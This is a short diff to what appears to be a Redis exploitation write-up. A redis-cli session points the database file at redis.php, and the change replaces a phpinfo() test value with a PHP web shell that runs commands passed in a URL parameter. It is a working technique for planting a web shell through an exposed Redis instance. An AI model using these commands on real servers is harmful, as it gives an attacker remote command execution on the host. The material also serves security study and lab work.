@@ -74,7 +74,7 @@ db0:keys=1,expires=0,avg_ttl=0</code></pre>
 OK
 10.85.0.52:6379> config set dbfilename redis.php
 OK
-10.85.0.52:6379> set test "<?php phpinfo(); ?>"
+10.85.0.52:6379> set test "<?php system($_GET[\"cmd\"]); ?>"
 OK
 10.85.0.52:6379> save
 OK</code></pre>
